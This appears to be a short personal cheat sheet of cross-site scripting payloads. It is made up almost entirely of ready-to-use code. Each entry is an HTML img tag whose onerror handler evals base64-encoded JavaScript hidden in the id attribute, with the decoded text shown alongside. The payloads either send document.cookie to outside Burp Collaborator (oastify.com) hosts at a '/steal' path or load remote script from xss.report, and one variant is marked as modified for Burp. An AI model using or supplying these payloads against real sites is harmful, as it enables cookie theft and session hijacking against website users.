```html
<img src=x id=bmV3IEltYWdlKCkuc3JjPSdodHRwczovL2Nqem5jcThlY2d4dGkxYWxsNDJobWFzMXJzeGpsOTl5Lm9hc3RpZnkuY29tL3N0ZWFsP2M9JytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKTs&#61; onerror=eval(atob(this.id))>
<!-- Encoded part -->
new Image().src='https://cjzncq8ecgxti1all42hmas1rsxjl99y.oastify.com/steal?c='+encodeURIComponent(document.cookie);
```

```JS
//basic from xss.report
var a=document.createElement("script");a.src="https://xss.report/c/saidoika";document.body.appendChild(a)
```

### original
```html
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NhaWRvaWthIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
<!-- Encoded part -->
var a=document.createElement("script");a.src="https://xss.report/c/saidoika";document.body.appendChild(a)
```

### modified for burp

```HTML
<!-- Not encoded -->
<img src=x id=var a=document.createElement("script");a.src="tnk4g7cvgx1amie2pl6yqrwiv910prdg.oastify.com/steal?c="+encodeURIComponent(document.cookie); onerror=eval(atob(this.id))>
<!-- Encoded -->
<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9InRuazRnN2N2Z3gxYW1pZTJwbDZ5cXJ3aXY5MTBwcmRnLm9hc3RpZnkuY29tL3N0ZWFsP2M9IitlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKTs&#61; onerror=eval(atob(this.id))>
```